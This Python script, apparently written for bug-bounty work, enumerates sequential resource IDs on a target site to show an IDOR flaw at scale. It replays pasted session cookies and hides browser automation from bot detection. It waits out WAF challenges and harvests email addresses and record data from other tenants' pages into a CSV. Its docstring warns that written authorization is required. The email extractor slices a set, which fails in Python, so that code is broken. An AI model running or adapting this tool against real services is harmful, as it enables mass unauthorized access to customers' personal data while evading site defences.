#!/usr/bin/env python3
"""ID enumeration probe — sweep sequential IDs to demonstrate IDOR-at-scale.

Use AFTER a single cross-tenant IDOR is already confirmed. The purpose here
is impact quantification, not discovery.

Usage:
    Edit BASE, ENDPOINT_TEMPLATE, COOKIES, ID_RANGE below. Run.

Notes:
- 20s pacing minimum. Faster will trigger WAF escalation on any modern stack.
- Output every successful 200 to a CSV — that's your impact table.
- DO NOT run against a target without explicit written authorization for
  enumeration. Reading 1000 customer records "for impact" without authz
  turns a P1 IDOR submission into an unauthorized-access criminal exposure.
"""
import time, csv, sys, re
from pathlib import Path
from playwright.sync_api import sync_playwright

BASE = "https://target.example.com"
ENDPOINT_TEMPLATE = "/resource/{id}/edit"
ID_RANGE = range(2_400_000, 2_400_010)  # tight by default; widen with authz
COOKIES = []  # paste Playwright-format cookies here
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
OUT = Path("./enum_results")
OUT.mkdir(parents=True, exist_ok=True)
PACING = 20

# Per-record fields you want to extract for the impact table.
# Adjust regexes/selectors to the target's HTML.
def extract_fields(body):
    return {
        "email":   ",".join(set(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", body))[:3]),
        "model":   (re.search(r'"class":"(\w+)","key":(\d+)', body) or [None, "?", "?"])[0],
        "len":     str(len(body)),
    }


def wait_waf(page, max_wait=30):
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            body = page.evaluate("document.body ? document.body.innerText.slice(0,400) : ''")
        except Exception:
            body = ""
        if "challenge" not in body.lower() and "JavaScript is disabled" not in body:
            return
        time.sleep(1.2)


def fetch(page, url):
    captured = {}
    def on_resp(r):
        if r.request.resource_type == "document" and r.url.rstrip("/") == url.rstrip("/"):
            try:
                captured["status"] = r.status
                captured["body"] = r.text()
            except Exception:
                pass
    page.on("response", on_resp)
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=60000)
    except Exception:
        pass
    for _ in range(10):
        time.sleep(1.0)
        if captured.get("status") and captured["status"] not in (202, 405):
            break
    page.remove_listener("response", on_resp)
    return captured


def main():
    csv_path = OUT / "enum_results.csv"
    with sync_playwright() as p:
        browser = p.chromium.launch(channel="chrome", headless=True,
            args=["--disable-blink-features=AutomationControlled",
                  "--no-first-run", "--no-default-browser-check"])
        ctx = browser.new_context(user_agent=UA, locale="en-US",
                                  viewport={"width": 1440, "height": 900})
        ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        ctx.add_cookies(COOKIES)
        # Prime WAF
        page = ctx.new_page()
        page.goto(f"{BASE}/", wait_until="domcontentloaded", timeout=60000)
        wait_waf(page, 30)
        print(f"[prime] OK at {page.url}")
        page.close()

        with csv_path.open("w", newline="") as fp:
            writer = csv.writer(fp)
            writer.writerow(["id", "status", "email", "model_class", "body_len"])
            for resource_id in ID_RANGE:
                url = f"{BASE}{ENDPOINT_TEMPLATE.format(id=resource_id)}"
                print(f"[probe id={resource_id}]")
                pg = ctx.new_page()
                try:
                    r = fetch(pg, url)
                    status = r.get("status", 0)
                    body = r.get("body", "")
                    fields = extract_fields(body) if status == 200 else {}
                    writer.writerow([resource_id, status, fields.get("email",""),
                                     fields.get("model",""), fields.get("len","0")])
                    print(f"  status={status} email={fields.get('email','-')}")
                finally:
                    pg.close()
                time.sleep(PACING)
        ctx.close()
        browser.close()
    print(f"\nResults written to {csv_path}")


if __name__ == "__main__":
    main()
